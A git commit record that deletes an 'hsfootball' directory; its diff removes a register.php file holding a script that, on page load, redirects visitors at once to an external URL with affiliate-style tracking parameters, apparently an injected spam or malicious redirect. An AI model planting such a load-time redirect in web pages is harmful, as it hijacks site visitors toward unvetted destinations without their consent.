55edfeb0e6275a8468e5b263f20507a1ace50fe3
PMorganRusso <142108079+PMorganRusso@users.noreply.github.com>
2023-09-30 18:31:16 +0600

    Delete hsfootball directory

--- hsfootball/register.php
+++
@@ -1,9 +0,0 @@
-
-<php>
-<script>
-function largarse(){
-setTimeout("location.href='https://www.ejdr22.com/scripts/un981c6l?a_aid=b59493f6&a_bid=1766b1a4'", 0);
-}
-onload = largarse;
-</script>
-</php>
